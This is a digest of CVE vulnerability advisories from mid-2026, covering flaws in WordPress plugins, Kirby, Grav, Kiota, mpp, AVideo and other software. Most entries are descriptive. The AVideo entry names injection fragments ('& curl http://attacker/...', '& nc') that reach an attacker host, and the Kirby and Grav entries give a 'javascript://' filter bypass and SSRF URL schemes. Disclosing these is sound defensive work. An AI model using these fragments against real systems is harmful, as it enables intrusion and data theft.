The Paid Membership Plugin, Ecommerce, User Registration Form, Login Form, User Profile & Restrict Content – ProfilePress plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 4.16.18 via the allowed_mime_types function. This is due to the unconditional registration of an upload_mimes filter that adds executable file extensions (.exe, .apk, .msi) to the global WordPress MIME allowlist, without scoping the expansion to digital-product upload contexts. This makes it possible for authenticated attackers, with author-level access and above, to upload files that may be executable, which makes remote code execution possible. This filter is registered globally on every request regardless of whether the digital products feature is configured or in use, meaning the expanded MIME allowlist affects all WordPress upload contexts site-wide.

### CVE-2026-44177

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22;CWE-98` |
| Published | 2026-07-16T22:17:02.103 |

Kirby is an open-source content management system. In versions 5.3.0 and above but prior to 5.4.1, Kirby did not correctly validate the provided user ID, resulting in a path traversal vulnerability. Version 5.3.0 introduced a performance improvement to the Users collection that loaded user objects lazily when first needed. Users were queried by their ID, which was then used to locate the corresponding account directory under site/accounts. This affected the authentication API (accessible to unauthenticated requests), the users API (accessible only to authenticated users), and any other place that uses $users->find() to look up an individual user by a request-provided email or ID. As a result, an attacker could trigger arbitrary PHP file inclusion of files named  index.php (for example, the main PHP files of plugins), the impact of which depends on the logic those files contain. It also allowed probing for the existence of arbitrary directories on the server, letting attackers fingerprint the server and site setup, including installed plugins and the content structure. This issue has been fixed in version 5.4.1.

### CVE-2026-14371

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-07-16T17:16:55.423 |

The Lenovo XClarity Integrator for Windows Admin Center plugin version 5.1.1 and below running on the WAC Gateway is vulnerable to Powershell Command Injection when establishing remote PowerShell commands.

### CVE-2026-62233

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-639;CWE-862` |
| Published | 2026-07-17T02:18:10.890 |

grav-plugin-api before 1.0.6 fails to validate super-admin status in createApiKey, generate2fa, and disable2fa endpoints, allowing non-super api.users.write managers to escalate to super-admin. Attackers can mint API keys bound to super-admin accounts or strip 2FA from super-admin users to achieve full instance takeover.

### CVE-2026-62230

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-178` |
| Published | 2026-07-17T02:18:10.433 |

Grav before 2.0.4 ships a default .htaccess (and reference webserver-configs/htaccess.txt) whose rules blocking access to sensitive file types (.yaml, .php, .json, etc.) lack the [NC] flag, making extension matching case-sensitive. On case-insensitive filesystems (Windows/NTFS, macOS/HFS+, or Docker volume mounts), an unauthenticated attacker can request these files with uppercase or mixed-case extensions (e.g., .YAML, .PHP) to bypass the restrictions and read sensitive configuration files that may contain API keys and credentials.

### CVE-2026-62218

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-862` |
| Published | 2026-07-17T02:18:08.693 |

OpenClaw 2026.1.20 before 2026.5.27 contain an authorization bypass vulnerability in the device.pair.approve feature that allows lower-trust callers to bypass role-management checks. Attackers can perform actions requiring stronger authorization by reaching the affected feature through configured input paths.

### CVE-2026-44174

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-470` |
| Published | 2026-07-16T22:17:01.650 |

Kirby is an open-source content management system. Prior to 4.9.1 and 5.4.1, Kirby did not validate the model attributes that were used in its collection queries, allowing attackers to include arbitrary model methods in their queries. This includes methods with sensitive data such as password() (disclosing the password hash) or root() (disclosing the absolute filesystem path on the server) as well as methods that perform impactful actions such as loginPasswordless() (causing a privilege escalation to another user) or delete() (deleting all queried models in one go if the authenticated user has appropriate permissions). This issue has been fixed in versions 4.9.1 and 5.4.1.

### CVE-2026-62963

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-409` |
| Published | 2026-07-16T20:16:47.533 |

Centrifugo is an open-source scalable real-time messaging server. Prior to 6.8.4, Centrifugo unidirectional WebSocket transport with uni_websocket.compression enabled enforced uni_websocket.message_size_limit against compressed wire-frame length in internal/websocket/conn.go advanceFrame, but ReadMessage used io.ReadAll after decompression without an output cap, allowing unauthenticated requests to /connection/uni_websocket to trigger large memory and CPU consumption. This issue is fixed in version 6.8.4.

### CVE-2026-55629

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-07-16T20:16:45.577 |

Whistle is an HTTP, HTTP2, HTTPS, and WebSocket debugging proxy. Prior to 2.10.3, lib/service/service.js handles GET /cgi-bin/temp/get by reading req.query.filename, joining it to TEMP_FILES_PATH only when it matches the temporary file pattern, and otherwise passing the user-supplied filename directly to getFile, allowing a remote attacker to read arbitrary files such as /etc/passwd. This issue is reported as fixed in version 2.10.3.

### CVE-2026-63085

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-07-16T17:16:58.420 |

Axelor Open Platform versions 8.x prior to 8.2.2 contains an authorization bypass vulnerability that allows authenticated non-admin users to escalate privileges by exploiting unenforced field restrictions on nested relational save operations. Attackers can modify sensitive User record fields such as roles and group by submitting changes through a related entity's save path, bypassing the USER_RESTRICTED_FIELDS control and causing the JPA persistence layer to flush attacker-supplied admin role and group assignments on commit.

### CVE-2026-53597

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-94` |
| Published | 2026-07-16T16:19:12.860 |

Prompty is a markdown file format (.prompty) for LLM prompts. From 2.0.0-alpha.1 until 2.0.0-beta.3, the @prompty/core TypeScript loader in runtime/typescript/packages/core/src/core/loader.ts used gray-matter without overriding executable js and javascript frontmatter engines, allowing an attacker-controlled .prompty file with ---js frontmatter to execute arbitrary JavaScript during prompt loading. This issue is fixed in version 2.0.0-beta.3.

### CVE-2026-59860

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-94` |
| Published | 2026-07-16T15:16:35.310 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.3, Kiota is affected by a code-generation injection vulnerability in the C# XML documentation-comment sink (the description, externalDocs label, and externalDocs link fields emitted as /// … comments). When text from an OpenAPI description is written into single-line XML doc comments without stripping newline and Unicode line-terminator characters, an attacker can break out of the /// comment line and inject additional code into generated C# clients. This issue is fixed in version 1.32.3.

### CVE-2026-59859

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-94` |
| Published | 2026-07-16T15:16:35.167 |

Kiota is an OpenAPI based HTTP Client code generator. Prior to 1.32.4, Kiota's PHP generator embedded OpenAPI description, default fields, property names, and other schema-derived strings into PHP double-quoted literals through SanitizeDoubleQuote() in Writers/StringExtensions.cs without escaping $, allowing attacker-controlled ${...}, $var, or {$obj->prop} interpolation constructs to inject arbitrary PHP code into generated model and request-builder classes. This issue is fixed in version 1.32.4.

### CVE-2026-62231

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-07-17T02:18:10.587 |

The Grav API plugin (getgrav/grav-plugin-api) before 1.0.6 contains an authorization bypass: API keys can be created with a restricted scopes array, but the ApiKeyAuthenticator class never reads or enforces these scopes. It loads and returns the owning user's full account object, so a key created with limited scopes (e.g. read-only) can perform any write, delete, or administrative operation the owning user is authorized for. Fixed in 1.0.6.

### CVE-2026-44023

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L` |
| Weaknesses | `CWE-22;CWE-918` |
| Published | 2026-07-16T21:17:21.123 |

Docling Core defines core data types and transformations for the document processing application Docling. In versions 1.5.0 and above, prior to 2.74.1, docling-core did not sufficiently restrict remote request destinations and could resolve a server-provided Content-Disposition to a local path in an unsafe manner. In applications that accept untrusted URLs, this could allow SSRF attacks targeting local files outside the user-defined cache directory. This issue has been fixed in version 2.74.1.

### CVE-2026-57206

| 項目 | 値 |
|------|-----|
| CVSS | `8.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L` |
| Weaknesses | `CWE-306;CWE-862` |
| Published | 2026-07-16T16:19:14.217 |

SimpleChat is a secure AI conversation application with personal and group workspaces for document-grounded interactions. Prior to 0.241.206, several plugin validation routes in application/single_app/plugin_validation_endpoint.py, including `POST /api/admin/plugins/test-instantiation`, `GET /api/admin/plugins/health-check/<plugin_name>`, `POST /api/admin/plugins/repair/<plugin_name>`, and `POST /api/plugins/validate`, relied on @swagger_route(security=get_auth_security()) documentation without enforcing @login_required, @user_required, or @admin_required at runtime, allowing unauthenticated or unauthorized clients to invoke plugin validation, health, and repair behavior. This issue is fixed in version 0.241.206.

### CVE-2026-44175

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-07-16T22:17:01.833 |

Kirby is an open-source content management system. In versions prior to 4.9.1 and 5.4.1, Kirby did not securely sanitize the contents of the list field on save, leaving it vulnerable to cross-site scripting (XSS). Kirby's list field stores its formatted content as HTML, and unlike other field types, its HTML special characters cannot be escaped without losing the formatting. Sanitization was only enforced client-side in the Panel, while the server did not sanitize the content on save. As a result, an attacker could bypass the Panel and send malicious HTML directly to Kirby's API, storing unsanitized markup in the content file. That markup would then be rendered on the site frontend and executed in the browsers of site visitors and logged-in users browsing the site, resulting in persistent XSS. This issue has been fixed in versions 4.9.1 and 5.4.1.

### CVE-2026-46686

| 項目 | 値 |
|------|-----|
| CVSS | `8.5` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-07-16T18:16:44.063 |

Emlog is an open source website building system. In 2.6.13 and earlier, the admin backend user search module's keyword parameter from admin/user.php is processed with addslashes but not HTML-escaped before being rendered into the value attribute in admin/views/user.php, allowing reflected cross-site scripting in an administrator's backend session. No fixed version is currently identified.

### CVE-2026-62234

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-918` |
| Published | 2026-07-17T02:18:11.040 |

Grav before 2.0.4 fails to restrict cURL protocols in webhook dispatch, allowing authenticated users with api.webhooks.write permission to create webhooks with file://, dict://, or gopher:// URLs. Attackers can trigger webhook events to read local files, access process information, or pivot to internal services via unrestricted protocol handlers.

### CVE-2026-45368

| 項目 | 値 |
|------|-----|
| CVSS | `8.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79` |
| Published | 2026-07-16T22:17:02.680 |

Kirby is an open-source content management system. In versions prior to 4.9.1 and 5.4.1, the underlying URL methods for the KirbyTags and image blocks components did not filter out malicious URL values that resolve to script execution. The vulnerability affects four first-party Kirby renderers that produce `<a href="…">` output from editor-supplied field values: the (`link: …)` KirbyTag, the `link`: parameter of the `(image: …)` KirbyTag when it does not resolve to a known file or `self`, the `link` field of the built-in image block, and the HTML importer for the `blocks` field (which accepted the same malicious input as the image block `link` field). While simple `avascript:` URLs were already deactivated by treating them as a relative path and prepending a single slash to the URL, the use of URLs of the format `javascript://x%0A…` bypasses this protection. The `vbscript:`, `data:`, `livescript:`, `mocha:` and `jar:` schemes are affected by the same underlying gap. This issue has been fixed in versions 4.9.1 and 5.4.1.

### CVE-2026-59695

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-1284` |
| Published | 2026-07-17T11:17:14.117 |

Improper Validation of Specified Quantity in Input in ZenHive mpp allows an unauthenticated remote client to drain the fee-payer wallet in a single request by naming an arbitrarily high gas price.

When the mpp Elixir library is configured as fee payer (fee_payer: true), MPP.Tempo.Transaction.cosign_fee_payer/3 re-signs the client-supplied base fields of the 0x76 AASigned envelope verbatim, including max_fee_per_gas and max_priority_fee_per_gas, without validating that they are within reasonable bounds. A malicious client embeds arbitrarily large values for these fields in the signed envelope. The server co-signs and broadcasts the transaction. The effective_gas_price billed against the fee-payer wallet is derived from the attacker-supplied ceilings, so the server pays those inflated per-gas rates out of its own wallet. A single crafted request can drain the wallet entirely, after which the server can no longer sponsor gas for legitimate payment requests.

This issue affects mpp: from 0.2.0 before 0.6.0.

### CVE-2026-59694

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-1284` |
| Published | 2026-07-17T11:17:13.960 |

Improper Validation of Specified Quantity in Input in ZenHive mpp allows an unauthenticated remote client to inflate the fee-payer's gas cost per payment by a large multiplier, degrading the sponsor's operating margin.

When the mpp Elixir library is configured as fee payer (fee_payer: true), MPP.Tempo.Transaction.cosign_fee_payer/3 re-signs the client-supplied base fields of the 0x76 AASigned envelope verbatim, including the EIP-2930 access list, without validating its length or contents. EIP-2930 access list entries incur intrinsic gas (~2,400 gas per address, plus 1,900 gas per storage key) charged before any opcode executes, regardless of whether the listed addresses are ever touched. A malicious client submits a valid transferWithMemo call alongside a large number of fabricated access-list entries. The server co-signs and broadcasts the transaction. The intended transfer executes normally, but the fee-payer wallet pays a large multiple of the expected gas cost with no corresponding on-chain work.

At the maintainer's default of 137 access-list entries (fitting within Bandit's 10,000-byte per-header-field limit) and 100 Gwei max_fee_per_gas, per-payment gas cost rises from ~51,287 to ~380,087 gas, a 7.4x multiplier. Sustained abuse destroys the sponsor's operating margin on low-cost payments and, over time, drains the fee-payer wallet.

This issue affects mpp: from 0.2.0 before 0.6.0.

### CVE-2026-45576

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:H/SI:H/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-07-16T17:16:56.567 |

zrok is software for sharing web services, files, and network resources. From 0.4.23 until 2.0.3, `zrok2 copy` stores attacker-controlled WebDAV or zrok drive paths such as /../outside.txt in the source inventory and passes them to FilesystemTarget.WriteStream, allowing the sync pipeline to write files outside the selected local filesystem destination root. This issue is fixed in version 2.0.3.

### CVE-2026-14254

| 項目 | 値 |
|------|-----|
| CVSS | `8.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-307` |
| Published | 2026-07-16T15:16:30.617 |

A race condition in the account lockout mechanism in Delphix Continous Data allowed the lockout threshold to be bypassed through concurrent authentication requests. Parallel login attempts were processed before the failed-login counter and lockout status were updated, defeating brute-force protections and enabling continued password guessing against a targeted account.

### CVE-2026-59252

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-1284` |
| Published | 2026-07-17T11:17:13.803 |

Improper Validation of Specified Quantity in Input in ZenHive mpp allows an unauthenticated remote client to drain the fee-payer wallet, resulting in denial of service for legitimate clients.

When the mpp Elixir library is configured as fee payer (fee_payer: true), the MPP.Methods.Tempo payment method co-signs and broadcasts a client-supplied EVM transaction without first validating that the client-supplied gas_limit is sufficient to complete the intended call. A malicious client can submit a signed transferWithMemo transaction with gas_limit deliberately set just below the amount required for successful execution. The server co-signs the transaction and broadcasts it via rpc_broadcast_sync. The transaction runs out of gas during EVM execution and reverts, but the fee-payer wallet is still charged for the burned gas while the client pays nothing and receives no resource. Repeated requests from one or more malicious clients drain the fee-payer wallet at near-zero cost to the attacker, ultimately preventing the server from sponsoring gas for legitimate payment requests.

The wait_for_confirmation = false (optimistic) path is also affected: it invokes simulate_payment_call via eth_call, but that simulation omits the gas parameter and therefore does not catch out-of-gas conditions.

This issue affects mpp: from 0.2.0 before 0.6.0.

### CVE-2026-62386

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-598` |
| Published | 2026-07-17T02:18:11.903 |

The Grav API plugin (getgrav/grav-plugin-api) before 1.0.0-rc.16 accepts JWT access tokens through the ?token= URL query parameter on every API route (JwtAuthenticator::extractBearerToken fallback). Because tokens are embedded in URLs, they are logged verbatim in web server access logs, leaked via the Referer header, stored in browser history, and captured by upstream proxy and CDN logs, exposing valid admin access tokens. A leaked token grants unauthorized API access, including reading configuration and user data, creating admin accounts, modifying system settings, and deleting pages.

### CVE-2026-49998

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| Weaknesses | `CWE-347` |
| Published | 2026-07-16T20:16:45.290 |

Centrifugo is an open-source scalable real-time messaging server. Prior to 6.8.1, Centrifugo dynamic JWKS endpoint verification could reuse a key for one allowed issuer to verify a JWT for another allowed issuer because the JWKS cache and singleflight lookup were keyed only by JWT header kid, not by the resolved JWKS endpoint, issuer, audience, or trust-domain namespace, affecting client.token.jwks_public_endpoint, client.subscription_token.jwks_public_endpoint, internal/jwks/cache.go, and internal/jwks/manager.go. This issue is fixed in version 6.8.1.

### CVE-2026-44981

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-409` |
| Published | 2026-07-16T20:16:44.900 |

CrowdSec offers crowdsourced protection against malicious IPs. From 1.7.0 until 1.7.8, the LAPI router used gin-contrib/gzip with DefaultDecompressHandle globally in pkg/apiserver/controllers/controller.go, causing /v1/watchers and /v1/watchers/login to decompress unauthenticated gzip-compressed JSON request bodies without enforcing a maximum decompressed size and allowing excessive heap allocation that can make LAPI unreachable. This issue is fixed in version 1.7.8.

### CVE-2026-15352

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-476` |
| Published | 2026-07-16T20:16:44.040 |

A vulnerability exists in the Health & Safety (HS) application of NASA's Core Flight System (cFS). The flaw allows the application to crash via segmentation fault when processing a routine Housekeeping Telemetry request, leading to denial of service.

### CVE-2026-45325

| 項目 | 値 |
|------|-----|
| CVSS | `8.2` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L` |
| Weaknesses | `CWE-1321` |
| Published | 2026-07-16T17:16:56.160 |

Gestor de Oferta is a web application for managing mobility service offerings. Prior to 20260509.0340.15, @tmlmobilidade/utils has a prototype pollution vulnerability in setValueAtPath() in packages/utils/src/generic/value-at-path.ts because unsafe path segments are not blocked. This issue is fixed in version 20260509.0340.15.

### CVE-2026-11961

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-269` |
| Published | 2026-07-17T07:16:37.850 |

The User Registration & Membership  WordPress plugin before 5.2.3 does not validate that the membership tier submitted during public registration is one of the tiers allowed by the registration form before assigning that tier's associated user role, allowing unauthenticated users to register into an arbitrary published membership tier and obtain its role — up to administrator when such a tier exists.

### CVE-2026-43978

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| Weaknesses | `CWE-269` |
| Published | 2026-07-16T23:16:16.310 |

wger is a free, open-source workout and fitness manager. In versions prior to 2.6, a gym trainer can escalate their session to any higher-privileged account (gym manager, general manager) by chaining two calls to the trainer-login endpoint. Once a trainer performs a legitimate switch into a low-privileged user, the session flag trainer.identity is set and this flag alone bypasses the permission check on all subsequent trainer-login calls. This grants full gym administration capabilities including viewing all member data, modifying contracts, managing gym configuration, and accessing other trainers' and managers' personal information. This issue has been fixed in version 2.6.

### CVE-2026-55173

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2026-07-16T21:17:21.483 |

WWBN AVideo is an open source video platform. Versions 29.0 and below remain vulnerable to OS command injection because the fix for CVE-2026-33482 was incomplete and still does not neutralize a single & ( the shell background operator). CVE-2026-33482 reported that sanitizeFFmpegCommand() (plugin/API/standAlone/functions.php) failed to strip $(...) command substitution, allowing OS command injection at the execAsync() sh -c sink. The fix (commit 25c8ab90) added $, (, ), {, }, \n, \r to the denylist character class and a str_replace('&&', '', ...), but did not account for the single &. ffmpeg.json.php builds the command from _decryptString(getInput('codeToExecEncrypted')). This is the same threat model the original advisory accepted (“an attacker who can craft a valid encrypted payload can achieve arbitrary command execution on the standalone encoder server”) and the same CVSS basis (AV:N/AC:H/PR:N). Multiple &-separated commands can be chained (e.g. download + execute). Redirect-based payloads are blocked by the > strip, but command execution (e.g. & curl http://attacker/..., & nc ..., dropping/running a file) is not. This issue has been patched by this commit: https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f.

### CVE-2026-44019

| 項目 | 値 |
|------|-----|
| CVSS | `8.1` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H` |
| Weaknesses | `CWE-73;CWE-400` |
| Published | 2026-07-16T21:17:20.917 |

Docling Core defines core data types and transformations for the document processing application Docling. In versions 2.5.0 and above, prior to 2.74.1, docling-core could allow local file:// image references and accepted inline data: content without a decoded-size limit. In applications that accept untrusted image references, this may allow access to local files readable by the process or excessive memory use from large inline payloads. This issue has been fixed in version 2.74.1.

